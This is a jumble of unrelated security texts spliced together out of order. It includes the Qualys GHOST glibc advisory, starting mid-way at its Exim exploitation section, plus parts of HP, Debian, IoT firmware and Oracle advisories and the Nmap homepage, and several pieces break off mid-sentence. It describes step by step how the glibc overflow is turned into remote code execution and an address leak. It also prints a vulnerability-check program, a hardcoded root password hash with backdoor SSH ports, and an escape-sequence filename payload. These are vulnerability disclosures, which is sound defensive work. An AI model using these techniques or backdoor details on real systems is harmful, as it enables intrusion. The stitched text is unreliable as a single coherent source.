inet\_aton(), and consequently a path to the buffer overflow.

--[ 5 - Exploitation ]--------------------------------------------------------
----[ 5.1 - Code execution ]--------------------------------------------------
In this section, we describe how we achieve remote code execution
against the Exim SMTP mail server, bypassing the NX (No-eXecute)
protection and glibc's malloc hardening.
First, we overflow gethostbyname's heap-based buffer and partially
overwrite the size field of the next contiguous free chunk of memory
with a slightly larger size (we overwrite only 3 bytes of the size
field; in any case, we cannot overflow more than 4 bytes on 32-bit
machines, or 8 bytes on 64-bit machines):
|< malloc\_chunk
|
-----|----------------------|---+--------------------|-----
... | gethostbyname buffer |p|s|f|b|F|B| free chunk | ...
-----|----------------------|---+--------------------|-----
| X|
|------------------------->|
overflow
where:
struct malloc\_chunk {
INTERNAL\_SIZE\_T prev\_size; /\* Size of previous chunk (if free). \*/
INTERNAL\_SIZE\_T size; /\* Size in bytes, including overhead. \*/
struct malloc\_chunk\* fd; /\* double links -- used only if free. \*/
struct malloc\_chunk\* bk;
/\* Only used for large blocks: pointer to next larger size. \*/
struct malloc\_chunk\* fd\_nextsize; /\* double links -- used only if free. \*/
struct malloc\_chunk\* bk\_nextsize;
};
and: X marks the spot where the crucial memory corruption takes place.
As a result, this artificially-enlarged free chunk, which is managed by
glibc's malloc, overlaps another block of memory, Exim's current\_block,
which is managed by Exim's internal memory allocator:
|< malloc\_chunk |< storeblock
| |
-----|----------------------|------------------------|---------------+---|-----
... | gethostbyname buffer |p|s|f|b|F|B| free chunk |n|l| current\_block | ...
-----|----------------------|------------------------|---------------+---|-----
| |
|<-------------------------------------->|
artificially enlarged free chunk
where:
typedef struct storeblock {
struct storeblock \*next;
size\_t length;
} storeblock;
Then, we partially allocate the enlarged free chunk and overwrite the
beginning of Exim's current\_block of memory (the "storeblock" structure)
with arbitrary data. In particular, we overwrite its "next" field:
|< malloc\_chunk |< storeblock
| |
-----|----------------------|------------------------|--------+----------|-----
... | gethostbyname buffer |p|s|f|b|F|B| aaaaaaaaaa |n|l| current\_block | ...
-----|----------------------|------------------------|--------+----------|-----
| X |
|<------------------------------->|
allocated chunk
This effectively turns gethostbyname's buffer overflow into a
write-anything-anywhere primitive, because we control both the pointer
to the next block of memory returned by Exim's allocator (the hijacked
"next" pointer) and the data allocated (a null-terminated string, the
argument of an SMTP command we send to Exim).
Finally, we use this write-anything-anywhere primitive to overwrite
Exim's run-time configuration, which is cached in the heap memory. More
precisely, we overwrite Exim's Access Control Lists (ACLs), and achieve
arbitrary command execution thanks to Exim's "${run{ }}"
string expansion mechanism:
|< storeblock
|
-----|-------------------------------|---------------|-------------------|-----
... | Exim's run-time configuration | ... .. .. ... |n|l| current\_block | ...
-----|----x--------------------------|---------------|x------------------|-----
| |
'<------------------------------------------'

|< ACLs >|
-----|----+-----+--------+------+----|---------------|-------------------|-----
... | Exim's run-time configuration | ... .. .. ... | old current\_block | ...
-----|----+-----+--------+------+----|---------------|-------------------|-----
| XXXXXXXX |
|<------------------->|
new current\_block
----[ 5.2 - Information leak ]------------------------------------------------
The success of this exploit depends on an important piece of
information: the address of Exim's run-time configuration in the heap.
In this section, we describe how we obtain this address, bypassing the
ASLR (Address Space Layout Randomization) and PIE (Position Independent
Executable) protections.
First, we overflow gethostbyname's heap-based buffer and partially
overwrite the size field of the next contiguous free chunk of memory
with a slightly larger size:
|< malloc\_chunk
|
-----|----------------------|---+-------------------------|-----
... | gethostbyname buffer |p|s|f|b|F|B| next free chunk | ...
-----|----------------------|---+-------------------------|-----
| X|
|------------------------->|
overflow
As a result, this artificially-enlarged free chunk overlaps another
block of memory, where Exim saves the error message "503 sender not yet
given\r\n" for later use:
|< malloc\_chunk
|
-----|----------------------|-----------------------------|----------+----|-----
... | gethostbyname buffer |p|s|f|b|F|B| real free chunk | error message | ...
-----|----------------------|-----------------------------|----------+----|-----
| |
|<-------------------------------------->|
artificially enlarged free chunk
Then, we partially allocate the artificially-enlarged free chunk,
thereby splitting it in two: the newly allocated chunk, and a smaller,
free chunk (the remainder from the split). The malloc\_chunk header for
this remaining free chunk overwrites the very beginning of the saved
error message with a pointer to the heap (the fd\_nextsize pointer):
|< malloc\_chunk |< malloc\_chunk
| |
-----|----------------------|---------------------+-------|----------+----|-----
... | gethostbyname buffer |p|s|f|b|F|B| aaaaaaa |p|s|f|b|F|B| r message | ...
-----|----------------------|---------------------+-------|----------+----|-----
| | X |
|<------------------->|<---------------->|
allocated chunk free chunk
Finally, we send an invalid SMTP command to Exim, and retrieve the
fd\_nextsize heap pointer from Exim's SMTP response, which includes the
corrupted error message. This effectively turns gethostbyname's buffer
overflow into an information leak; moreover, it allows us to distinguish
between 32-bit and 64-bit machines.

            in HP Customer Notice: HPSN-2008-002

RESOLUTION

HP recommends the following software updates and workaround instructions to
resolve this vulnerability for HP IceWall SSO Dfw.

The glibc updates are available for RHEL4, RHEL5, and RHEL6 at:

<https://access.redhat.com/security/cve/CVE-2015-0235>

WORKAROUND INSTRUCTIONS

HP recommends following this information after applying the updates to
protect against potential risk for the specified HP IceWall products.

HP IceWall SSO Dfw

The AGENT_PERMIT configuration parameter allows Dfw to restrict requests from
the Agent (another module) by using one of following methods: IP (IP
address), HOST(host name) and DOMAIN (domain name).
If possible, do not specify the "IP" value as the evaluation method in
setting AGENT_PERMIT. Instead, use "HOST" or "DOMAIN". Dfw calls the
gethostbyname() function only if the "IP" method is specified.

Note: The HP IceWall product is only available in Japan.

security issues.

Vulnerability overview/description:
-----------------------------------
1) Outdated Vulnerable Software Components
A static scan with the IoT Inspector (ONEKEY) revealed outdated software packages that
are used in the devices' firmware. Four of them were verified by using the
MEDUSA scalable firmware runtime.

2) Hardcoded Backdoor User (CVE-2022-32985)
A hardcoded root user was found in "/etc/passwd". In combination with the
invoked dropbear SSH daemon in the libnx_apl.so library, it can be used on port
50201 and 50200 to login on a system shell.

Proof of concept:
-----------------
1) Outdated Vulnerable Software Components
Based on an automated scan with the IoT Inspector (ONEKEY) the following third party
software packages were found to be outdated:

Firmware version 6.02L:
BusyBox       1.20.2
Dropbear SSH  2012.55
GNU glibc     2.17
lighttpd      1.4.48
OpenSSL       1.0.2h

The following CVEs were verified with MEDUSA scalable firmware emulation:

* CVE-2015-9261 (Unzip)
The crafted ZIP archive "x_6170921383890712452.bin" was taken from:
<https://www.openwall.com/lists/oss-security/2015/10/25/3>
Execution inside the firmware emulation:

* CVE-2017-16544 (shell autocompletion vulnerability)

A file with the name "\ectest\n\e]55;test.txt\a" was created to trigger the
vulnerability.
-------------------------------------------------------------------------------
# ls "pressing <TAB>"
test
]55;test.txt
#
-------------------------------------------------------------------------------

2) Hardcoded Backdoor User (CVE-2022-32985)
The hardcoded system user, reachable via the dropbear SSH daemon was found due
to multiple indications on the system. The undocumented root user itself was
contained in the "passwd" file:

Content of the file "/etc/passwd".
-------------------------------------------------------------------------------
root:oFQzvQf5qrI56:0:0:root:/home/root:/bin/sh
[...]
-------------------------------------------------------------------------------

A suspicious port for the SSH daemon was chosen in the config file of dropbear:

Content of the file "/etc/init.d/dropbear":
-------------------------------------------------------------------------------
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
DAEMON=/usr/sbin/dropbear
NAME=dropbear
DESC="Dropbear SSH server"
PIDFILE=/var/run/dropbear.pid

DROPBEAR_PORT="50200 -p 50201"
[...]
-------------------------------------------------------------------------------

This is invoked from "/usr/lib/libnx_apl.so.0.0.0", which can be seen in the
following pseudo-code:
-------------------------------------------------------------------------------
void dropbear_server_init(char param_1)

{
   __pid_t __pid;
   char *pcVar1;
   int aiStack16 [2];

   __pid = fork();
   if (__pid == 0) {
     __pid = fork();
     if (__pid != 0) {
                     /* WARNING: Subroutine does not return */
       exit(0);
     }
     if (param_1 == '\0') {
       pcVar1 = "/etc/init.d/dropbear stop";
     }
     else {

Debian Security Advisory DSA-3142-1                   security@debian.org

Package        : eglibc
CVE ID         : CVE-2012-6656 CVE-2014-6040 CVE-2014-7817 CVE-2015-0235

Several vulnerabilities have been fixed in eglibc, Debian's version of
the GNU C library:

CVE-2015-0235

    Qualys discovered that the gethostbyname and gethostbyname2
    functions were subject to a buffer overflow if provided with a
    crafted IP address argument.  This could be used by an attacker to
    execute arbitrary code in processes which called the affected
    functions.

    The original glibc bug was reported by Peter Klotz.

CVE-2014-7817

    Tim Waugh of Red Hat discovered that the WRDE_NOCMD option of the
    wordexp function did not suppress command execution in all cases.
    This allows a context-dependent attacker to execute shell
    commands.

CVE-2012-6656
CVE-2014-6040

    The charset conversion code for certain IBM multi-byte code pages
    could perform an out-of-bounds array access, causing the process
    to crash.  In some scenarios, this allows a remote attacker to
    cause a persistent denial of service.

For the stable distribution (wheezy), these problems have been fixed in
version 2.13-38+deb7u7.

For the upcoming stable distribution (jessie) and the unstable
distribution (sid), the CVE-2015-0235 issue has been fixed in version
2.18-1 of the glibc package.

We recommend that you upgrade your eglibc packages.

# Nmap: Discover your network

Nmap ("Network Mapper") is a
[free and open source](/npsl/) utility for
network discovery and security auditing. Many systems and network
administrators also find it useful for tasks such as network
inventory, managing service upgrade schedules, and monitoring host or
service uptime. Nmap uses raw IP packets in novel ways to determine
what hosts are available on the network, what services (application
name and version) those hosts are offering, what operating systems
(and OS versions) they are running, what type of packet
filters/firewalls are in use, and dozens of other characteristics. It
was designed to rapidly scan large networks, but works fine against
single hosts. Nmap runs on all major computer operating systems, and
official binary packages are available for Linux, Windows, and Mac OS
X. In addition to the classic command-line Nmap executable, the Nmap
suite includes an advanced GUI and results viewer
([Zenmap](/zenmap/)), a flexible data
transfer, redirection, and debugging tool
([Ncat](/ncat/)), a utility for
comparing scan results ([Ndiff](/ndiff/)), and a packet generation and response analysis tool ([Nping](/nping/)).

Nmap was named “Security Product of the Year” by Linux
Journal, Info World, LinuxQuestions.Org, and Codetalker Digest. It
was even featured in [twelve
movies](/movies/), including
[The Matrix Reloaded](/movies/#matrix),
[Die Hard 4](/movies/#diehard4),
[Girl With the Dragon Tattoo](/movies/#gwtdt),
and
[The Bourne Ultimatum](/movies/#bourne).

Nmap is ...

* Nmap
  Security
  Port Scanner
* **Flexible**: Supports dozens of advanced techniques for
  mapping out networks filled with IP filters, firewalls, routers, and
  other obstacles. This includes many [port scanning](/book/man-port-scanning-techniques.html) mechanisms (both TCP &
  UDP), [OS
  detection](/book/osdetect.html), [version detection](/book/vscan.html), ping sweeps, and more. See the [documentation page](/docs.html).* **Powerful**: Nmap has been used to scan huge networks of
    literally hundreds of thousands of machines.* **Portable**: Most operating systems are supported, including
      Linux,
      Microsoft Windows,
      FreeBSD,
      OpenBSD,
      Solaris,
      IRIX,
      Mac OS X,
      HP-UX,
      NetBSD,
      Sun OS,
      Amiga,
      and more.* **Easy**: While Nmap offers a rich set of advanced features for
        power users, you can start out as simply as "nmap -v -A *targethost*". Both traditional command line and graphical (GUI)
        versions are available to suit your preference. Binaries are
        available for those who do not wish to compile Nmap from source.* **Free**: The primary goals of the Nmap Project is to help make
          the Internet a little more secure and to provide
          administrators/auditors/hackers with an advanced tool for exploring
          their networks. Nmap is available for [free download](https://nmap.org/download.html), and also comes with full
          source code that you may modify and redistribute under the terms of
          the [license](data/COPYING).* **Well Documented**: Significant effort has been put into
            comprehensive and up-to-date man pages, whitepapers, tutorials, and
            even a whole book! Find them in multiple
            languages [here](/docs.html).* **Supported**: While Nmap comes with no warranty, it is well supported by a vibrant community of developers and users. Most of this interaction occurs on the [Nmap mailing lists](#lists). Most bug reports and questions should be sent to the [nmap-dev list](https://seclists.org/nmap-dev), but only after you read the [guidelines](/book/man-bugs.html). We recommend that all users subscribe to the low-traffic [nmap-hackers](https://seclists.org/nmap-hackers) announcement list. You can also find Nmap on [Facebook](http://facebook.com/nmap) and [Twitter](http://twitter.com/nmap). For real-time chat, join the #nmap channel on [Freenode](http://freenode.net/) or [EFNet](http://www.efnet.org/).* **Acclaimed**: Nmap has won numerous awards, including
                "Information Security Product of the Year" by Linux Journal, Info
                World and Codetalker Digest. It has been featured in hundreds of
                magazine articles, several movies, dozens of books, and one comic book
                series. Visit the [press page](nmap_inthenews.html)
                for further details.* **Popular**: Thousands of people download Nmap every day, and
                  it is included with many operating systems (Redhat Linux, Debian
                  Linux, Gentoo, FreeBSD, OpenBSD, etc). It is among the top ten (out of
                  30,000) programs at the Freshmeat.Net repository. This is important
                  because it lends Nmap its vibrant development and user support
                  communities.

## Communication

Nmap users are encouraged to subscribe to the *Nmap-hackers*
mailing list. It is a low volume (6 posts in 2017), moderated list
for the most important announcements about Nmap, Insecure.org, and
related projects. You can join more than 128,000 current subscribers
by submitting your email address here:

(or subscribe with custom options from the [Nmap-hackers list info page](https://nmap.org/mailman/listinfo/announce))

We also have a development list for more hardcore members
(especially programmers) who are interested in helping the project by
helping with coding, testing, feature ideas, etc. New (test/beta)
versions of Nmap are sometimes released here prior to general
availability for QA purposes. You can subscribe at the [Nmap-dev list
info page](https://nmap.org/mailman/listinfo/dev).

Both lists are archived (along with many other security lists) at [Seclists.org](https://seclists.org).

Though it isn't nearly as active as the mailing lists, the official IRC channel is #nmap on [Freenode](http://freenode.net/) (irc.freenode.net).

# Oracle Critical Patch Update Advisory - October 2018

## Oracle Critical Patch Update Advisory - October 2018

### Description

A Critical Patch Update is a collection of patches for multiple security vulnerabilities. Critical Patch Update patches are usually cumulative, but each advisory describes only the security fixes added since the previous Critical Patch Update advisory. Thus, prior Critical Patch Update advisories should be reviewed for information regarding earlier published security fixes. Please refer to:

* [Critical Patch Updates, Security Alerts and Bulletins](https://www.oracle.com/securityalerts) for information about Oracle Security Advisories.

**Oracle continues to periodically receive reports of attempts to maliciously exploit vulnerabilities for which Oracle has already released fixes. In some instances, it has been reported that attackers have been successful because targeted customers had failed to apply available Oracle patches. Oracle therefore strongly recommends that customers remain on actively-supported versions and apply Critical Patch Update fixes without delay.**

This Critical Patch Update contains 301 new security fixes across the product families listed below. Please note that an MOS note summarizing the content of this Critical Patch Update and other Oracle Software Security Assurance activities is located at  [October 2018 Critical Patch Update: Executive Summary and Analysis](https://support.oracle.com/epmos/faces/DocumentDisplay?id=2456979.1).

#### Note:

* Vulnerabilities affecting Oracle Database and Oracle Fusion Middleware may affect Oracle Fusion Applications, so Oracle customers should refer to Oracle Fusion Applications Critical Patch Update Knowledge Document, [My Oracle Support Note 1967316.1](https://support.oracle.com/epmos/faces/DocumentDisplay?id=1967316.1) for information on patches to be applied to Fusion Application environments.
* Vulnerabilities affecting Oracle Solaris may affect Oracle ZFSSA so Oracle customers should refer to the Oracle and Sun Systems Product Suite Critical Patch Update Knowledge Document, [My Oracle Support Note 2160904.1](https://support.oracle.com/epmos/faces/DocumentDisplay?id=2160904.1) for information on minimum revisions of security fixes required to resolve ZFSSA issues published in Critical Patch Updates and Solaris Third Party bulletins.
* Users running Java SE with a browser can download the latest release from <http://java.com>. Users on the Windows and Mac OS X platforms can also use [automatic updates](https://www.java.com/en/download/help/java_update.xml) to get the latest release.

### Risk Matrix Content

Risk matrices list only security vulnerabilities that are newly fixed by the patches associated with this advisory. Risk matrices for previous security fixes can be found in [previous Critical Patch Update advisories](https://www.oracle.com/securityalerts). An English text version of the risk matrices provided in this document is  [here](/security-alerts/cpuoct2018verbose.html).

Several vulnerabilities addressed in this Critical Patch Update affect multiple products. Each vulnerability is identified by a [CVE#](http://cve.mitre.org/) which is a unique identifier for a vulnerability. A vulnerability that affects multiple products will appear with the same CVE# in all risk matrices. A CVE# shown in *italics* indicates that this vulnerability impacts a different product, but also has impact on the product where the italicized CVE# is listed.

Security vulnerabilities are scored using CVSS version 3.0 (see [Oracle CVSS Scoring](/security-alerts/cvssscoringsystem.html) for an explanation of how Oracle applies CVSS version 3.0).

Oracle conducts an analysis of each security vulnerability addressed by a Critical Patch Update. Oracle does not disclose detailed information about this security analysis to customers, but the resulting Risk Matrix and associated documentation provide information about the type of vulnerability, the conditions required to exploit it, and the potential impact of a successful exploit. Oracle provides this information, in part, so that customers may conduct their own risk analysis based on the particulars of their product usage. For more information, see [Oracle vulnerability disclosure policies](/corporate/security-practices/assurance/vulnerability/disclosure.html).

The protocol in the risk matrix implies that all of its secure variants (if applicable) are affected as well. For example, if HTTP is listed as an affected protocol, it implies that HTTPS (if applicable) is also affected. The secure variant of a protocol is listed in the risk matrix only if it is the *only* variant affected, e.g. HTTPS will typically be listed for vulnerabilities in SSL and TLS.

### Workarounds

**Due to the threat posed by a successful attack, Oracle strongly recommends that customers apply Critical Patch Update fixes as soon as possible**. Until you apply the Critical Patch Update fixes, it may be possible to reduce the risk of successful attack by blocking network protocols required by an attack. For attacks that require certain privileges or access to certain packages, removing the privileges or the ability to access the packages from users that do not need the privileges may help reduce the risk of successful attack. Both approaches may break application functionality, so Oracle strongly recommends that customers test changes on non-production systems. Neither approach should be considered a long-term solution as neither corrects the underlying problem.

### Skipped Critical Patch Updates

Oracle strongly recommends that customers apply security fixes as soon as possible. For customers that have skipped one or more Critical Patch Updates and are concerned about products that do not have security fixes announced in this Critical Patch Update, please review [previous Critical Patch Update advisories](https://www.oracle.com/securityalerts) to determine appropriate actions.

### Critical Patch Update Supported Products and Versions

Patches released through the Critical Patch Update program are provided only for product versions that are covered under the Premier Support or Extended Support phases of the  [Lifetime Support Policy](/support/lifetime-support/). Oracle recommends that customers plan product upgrades to ensure that patches released through the Critical Patch Update program are available for the versions they are currently running.

Product releases that are not under Premier Support or Extended Support are not tested for the presence of vulnerabilities addressed by this Critical Patch Update. However, it is likely that earlier versions of affected releases are also affected by these vulnerabilities. As a result, Oracle recommends that customers upgrade to supported versions.

Database, Fusion Middleware, and Oracle Enterprise Manager products are patched in accordance with the Software Error Correction Support Policy explained in [My Oracle Support Note 209768.1](https://support.oracle.com/epmos/faces/DocumentDisplay?id=209768.1). Please review the [Technical Support Policies](/support/policies.html) for further guidelines regarding support policies and phases of support.

#### Notes:

1. Outside In Technology is a suite of software development kits (SDKs). The protocol and CVSS score depend on the software that uses the Outside In Technology code. The CVSS score assumes that the software passes data received over a network directly to Outside In Technology code, but if data is not received over a network the CVSS score may be lower.

### Oracle Java SE Risk Matrix

This Critical Patch Update contains 12 new security fixes for Oracle Java SE. 11 of these vulnerabilities may be remotely exploitable without authentication, i.e., may be exploited over a network without requiring user credentials. The English text form of this Risk Matrix can be found [here](/security-alerts/cpuoct2018verbose.html#JAVA).

The CVSS scores below assume that a user running a Java applet or Java Web Start application (in Java SE 8) has administrator privileges (typical on Windows). When the user does not run with administrator privileges (typical on Solaris and Linux), the corresponding CVSS impact scores for Confidentiality, Integrity, and Availability are "Low" instead of "High", lowering the CVSS Base Score. For example, a Base Score of 9.6 becomes 7.1.

--[ 1 - Summary ]-------------------------------------------------------------

During a code audit performed internally at Qualys, we discovered a
buffer overflow in the __nss_hostname_digits_dots() function of the GNU
C Library (glibc). This bug is reachable both locally and remotely via
the gethostbyname*() functions, so we decided to analyze it -- and its
impact -- thoroughly, and named this vulnerability "GHOST".

Our main conclusions are:

- Via gethostbyname() or gethostbyname2(), the overflowed buffer is
  located in the heap. Via gethostbyname_r() or gethostbyname2_r(), the
  overflowed buffer is caller-supplied (and may therefore be located in
  the heap, stack, .data, .bss, etc; however, we have seen no such call
  in practice).

- At most sizeof(char *) bytes can be overwritten (ie, 4 bytes on 32-bit
  machines, and 8 bytes on 64-bit machines). Bytes can be overwritten
  only with digits ('0'...'9'), dots ('.'), and a terminating null
  character ('\0').

- Despite these limitations, arbitrary code execution can be achieved.
  As a proof of concept, we developed a full-fledged remote exploit
  against the Exim mail server, bypassing all existing protections
  (ASLR, PIE, and NX) on both 32-bit and 64-bit machines. We will
  publish our exploit as a Metasploit module in the near future.

- The first vulnerable version of the GNU C Library is glibc-2.2,
  released on November 10, 2000.

- We identified a number of factors that mitigate the impact of this
  bug. In particular, we discovered that it was fixed on May 21, 2013
  (between the releases of glibc-2.17 and glibc-2.18). Unfortunately, it
  was not recognized as a security threat; as a result, most stable and
  long-term-support distributions were left exposed (and still are):
  Debian 7 (wheezy), Red Hat Enterprise Linux 6 & 7, CentOS 6 & 7,
  Ubuntu 12.04, for example.

--[ 2 - Analysis ]------------------------------------------------------------

The vulnerable function, __nss_hostname_digits_dots(), is called
internally by the glibc in nss/getXXbyYY.c (the non-reentrant version)
and nss/getXXbyYY_r.c (the reentrant version). However, the calls are
surrounded by #ifdef HANDLE_DIGITS_DOTS, a macro defined only in:

- inet/gethstbynm.c
- inet/gethstbynm2.c
- inet/gethstbynm_r.c
- inet/gethstbynm2_r.c
- nscd/gethstbynm3_r.c

These files implement the gethostbyname*() family, and hence the only
way to reach __nss_hostname_digits_dots() and its buffer overflow. The
purpose of this function is to avoid expensive DNS lookups if the
hostname argument is already an IPv4 or IPv6 address.

The code below comes from glibc-2.17:

 35 int
 36 __nss_hostname_digits_dots (const char *name, struct hostent *resbuf,
 37                             char **buffer, size_t *buffer_size,
 38                             size_t buflen, struct hostent **result,
 39                             enum nss_status *status, int af, int *h_errnop)

 ..
 85       size_needed = (sizeof (*host_addr)
 86                      + sizeof (*h_addr_ptrs) + strlen (name) + 1);
 87
 88       if (buffer_size == NULL)
 89         {
 90           if (buflen < size_needed)
 91             {
 ..
 95               goto done;
 96             }
 97         }
 98       else if (buffer_size != NULL && *buffer_size < size_needed)
 99         {
100           char *new_buf;
101           *buffer_size = size_needed;
102           new_buf = (char *) realloc (*buffer, *buffer_size);
103
104           if (new_buf == NULL)
105             {

114               goto done;

116           *buffer = new_buf;
117         }
...
121       host_addr = (host_addr_t *) *buffer;
122       h_addr_ptrs = (host_addr_list_t *)
123         ((char *) host_addr + sizeof (*host_addr));
124       h_alias_ptr = (char **) ((char *) h_addr_ptrs + sizeof (*h_addr_ptrs));
125       hostname = (char *) h_alias_ptr + sizeof (*h_alias_ptr);
126
127       if (isdigit (name[0]))
128         {
129           for (cp = name;; ++cp)
130             {
131               if (*cp == '\0')
132                 {
133                   int ok;
134
135                   if (*--cp == '.')
136                     break;
...
142                   if (af == AF_INET)
143                     ok = __inet_aton (name, (struct in_addr *) host_addr);
144                   else
145                     {
146                       assert (af == AF_INET6);
147                       ok = inet_pton (af, name, host_addr) > 0;
148                     }
149                   if (! ok)
150                     {
...
154                       goto done;
155                     }
156
157                   resbuf->h_name = strcpy (hostname, name);
...
194                   goto done;
195                 }
196
197               if (!isdigit (*cp) && *cp != '.')
198                 break;
199             }
200         }
...

Lines 85-86 compute the size_needed to store three (3) distinct entities
in buffer: host_addr, h_addr_ptrs, and name (the hostname). Lines 88-117
make sure the buffer is large enough: lines 88-97 correspond to the
reentrant case, lines 98-117 to the non-reentrant case.

Lines 121-125 prepare pointers to store four (4) distinct entities in
buffer: host_addr, h_addr_ptrs, h_alias_ptr, and hostname. The sizeof
(*h_alias_ptr) -- the size of a char pointer -- is missing from the
computation of size_needed.

The strcpy() on line 157 should therefore allow us to write past the end
of buffer, at most (depending on strlen(name) and alignment) 4 bytes on
32-bit machines, or 8 bytes on 64-bit machines. There is a similar
strcpy() after line 200, but no buffer overflow:

236           size_needed = (sizeof (*host_addr)
237                          + sizeof (*h_addr_ptrs) + strlen (name) + 1);
...
267           host_addr = (host_addr_t *) *buffer;
268           h_addr_ptrs = (host_addr_list_t *)
269             ((char *) host_addr + sizeof (*host_addr));
270           hostname = (char *) h_addr_ptrs + sizeof (*h_addr_ptrs);
...
289                   resbuf->h_name = strcpy (hostname, name);

In order to reach the overflow at line 157, the hostname argument must
meet the following requirements:

- Its first character must be a digit (line 127).

- Its last character must not be a dot (line 135).

- It must comprise only digits and dots (line 197) (we call this the
  "digits-and-dots" requirement).

- It must be long enough to overflow the buffer. For example, the
  non-reentrant gethostbyname*() functions initially allocate their
  buffer with a call to malloc(1024) (the "1-KB" requirement).

- It must be successfully parsed as an IPv4 address by inet_aton() (line
  143), or as an IPv6 address by inet_pton() (line 147). Upon careful
  analysis of these two functions, we can further refine this
  "inet-aton" requirement:

  . It is impossible to successfully parse a "digits-and-dots" hostname
    as an IPv6 address with inet_pton() (':' is forbidden). Hence it is
    impossible to reach the overflow with calls to gethostbyname2() or
    gethostbyname2_r() if the address family argument is AF_INET6.

  . Conclusion: inet_aton() is the only option, and the hostname must
    have one of the following forms: "a.b.c.d", "a.b.c", "a.b", or "a",
    where a, b, c, d must be unsigned integers, at most 0xfffffffful,
    converted successfully (ie, no integer overflow) by strtoul() in
    decimal or octal (but not hexadecimal, because 'x' and 'X' are
    forbidden).

--[ 3 - Mitigating factors ]--------------------------------------------------

The impact of this bug is reduced significantly by the following
reasons:

- A patch already exists (since May 21, 2013), and has been applied and
  tested since glibc-2.18, released on August 12, 2013:

        [BZ #15014]
        * nss/getXXbyYY_r.c (INTERNAL (REENTRANT_NAME))
        [HANDLE_DIGITS_DOTS]: Set any_service when digits-dots parsing was
        successful.
        * nss/digits_dots.c (__nss_hostname_digits_dots): Remove
        redundant variable declarations and reallocation of buffer when
        parsing as IPv6 address.  Always set NSS status when called from
        reentrant functions.  Use NETDB_INTERNAL instead of TRY_AGAIN when
        buffer too small.  Correct computation of needed size.
        * nss/Makefile (tests): Add test-digits-dots.
        * nss/test-digits-dots.c: New test.

- The gethostbyname*() functions are obsolete; with the advent of IPv6,
  recent applications use getaddrinfo() instead.

- Many programs, especially SUID binaries reachable locally, use
  gethostbyname() if, and only if, a preliminary call to inet_aton()
  fails. However, a subsequent call must also succeed (the "inet-aton"
  requirement) in order to reach the overflow: this is impossible, and
  such programs are therefore safe.

- Most of the other programs, especially servers reachable remotely, use
  gethostbyname() to perform forward-confirmed reverse DNS (FCrDNS, also
  known as full-circle reverse DNS) checks. These programs are generally
  safe, because the hostname passed to gethostbyname() has normally been
  pre-validated by DNS software:

  . "a string of labels each containing up to 63 8-bit octets, separated
    by dots, and with a maximum total of 255 octets." This makes it
    impossible to satisfy the "1-KB" requirement.

  . Actually, glibc's DNS resolver can produce hostnames of up to
    (almost) 1025 characters (in case of bit-string labels, and special
    or non-printable characters). But this introduces backslashes ('\\')
    and makes it impossible to satisfy the "digits-and-dots"
    requirement.

--[ 4 - Case studies ]--------------------------------------------------------

In this section, we will analyze real-world examples of programs that
call the gethostbyname*() functions, but we first introduce a small test
program that checks whether a system is vulnerable or not:

[user@fedora-19 ~]$ cat > GHOST.c << EOF
#include <netdb.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

struct {
  char buffer[1024];
  char canary[sizeof(CANARY)];
} temp = { "buffer", CANARY };

int main(void) {
  struct hostent resbuf;
  struct hostent *result;
  int herrno;
  int retval;

  /*** strlen (name) = size_needed - sizeof (*host_addr) - sizeof (*h_addr_ptrs) - 1; ***/
  size_t len = sizeof(temp.buffer) - 16*sizeof(unsigned char) - 2*sizeof(char *) - 1;
  char name[sizeof(temp.buffer)];
  memset(name, '0', len);
  name[len] = '\0';

  retval = gethostbyname_r(name, &resbuf, temp.buffer, sizeof(temp.buffer), &result, &herrno);

  if (strcmp(temp.canary, CANARY) != 0) {
    puts("vulnerable");
    exit(EXIT_SUCCESS);
  }
  if (retval == ERANGE) {
    puts("not vulnerable");
    exit(EXIT_SUCCESS);
  }
  puts("should not happen");
  exit(EXIT_FAILURE);
}
EOF

[user@fedora-19 ~]$ gcc GHOST.c -o GHOST

On Fedora 19 (glibc-2.17):

[user@fedora-19 ~]$ ./GHOST
vulnerable

On Fedora 20 (glibc-2.18):

[user@fedora-20 ~]$ ./GHOST
not vulnerable

----[ 4.1 - The GNU C Library ]-----------------------------------------------

The glibc itself contains a few calls to gethostbyname*() functions. In
particular, getaddrinfo() calls gethostbyname2_r() if, but only if, a
first call to inet_aton() fails: in accordance with the "inet-aton"
requirement, these internal calls are safe. For example,
eglibc-2.13/sysdeps/posix/getaddrinfo.c:

      at->family = AF_UNSPEC;
      ...
      if (__inet_aton (name, (struct in_addr *) at->addr) != 0)
        {
          if (req->ai_family == AF_UNSPEC || req->ai_family == AF_INET)
            at->family = AF_INET;
          else if (req->ai_family == AF_INET6 && (req->ai_flags & AI_V4MAPPED))
            {
              ...
              at->family = AF_INET6;
            }
          else
            return -EAI_ADDRFAMILY;
          ...
        }
      ...
      if (at->family == AF_UNSPEC && (req->ai_flags & AI_NUMERICHOST) == 0)
        {
          ...
              size_t tmpbuflen = 512;
              char *tmpbuf = alloca (tmpbuflen);
              ...
                  rc = __gethostbyname2_r (name, family, &th, tmpbuf,
                                           tmpbuflen, &h, &herrno);
          ...
        }

----[ 4.2 - mount.nfs ]-------------------------------------------------------

Similarly, mount.nfs (a SUID-root binary) is not vulnerable:

        if (inet_aton(hostname, &addr->sin_addr))
                return 0;
        if ((hp = gethostbyname(hostname)) == NULL) {
                nfs_error(_("%s: can't get address for %s\n"),
                                progname, hostname);
                return -1;
        }

----[ 4.3 - mtr ]-------------------------------------------------------------

mtr (another SUID-root binary) is not vulnerable either, because it
calls getaddrinfo() instead of gethostbyname*() functions on any modern
(ie, IPv6-enabled) system:

#ifdef ENABLE_IPV6
  /* gethostbyname2() is deprecated so we'll use getaddrinfo() instead. */
  ...
  error = getaddrinfo( Hostname, NULL, &hints, &res );
  if ( error ) {
    if (error == EAI_SYSTEM)
       perror ("Failed to resolve host");
    else
       fprintf (stderr, "Failed to resolve host: %s\n", gai_strerror(error));
    exit( EXIT_FAILURE );
  }
  ...
#else
    host = gethostbyname(Hostname);
  if (host == NULL) {
    herror("mtr gethostbyname");
    exit(1);
  }
  ...
#endif

----[ 4.4 - iputils ]---------------------------------------------------------

------[ 4.4.1 - clockdiff ]---------------------------------------------------

clockdiff is vulnerable in a straightforward manner:

        hp = gethostbyname(argv[1]);
        if (hp == NULL) {
                fprintf(stderr, "clockdiff: %s: host not found\n", argv[1]);
                exit(1);
        }

------[ 4.4.2 - ping and arping ]---------------------------------------------

ping and arping call gethostbyname() and gethostbyname2(), respectively,
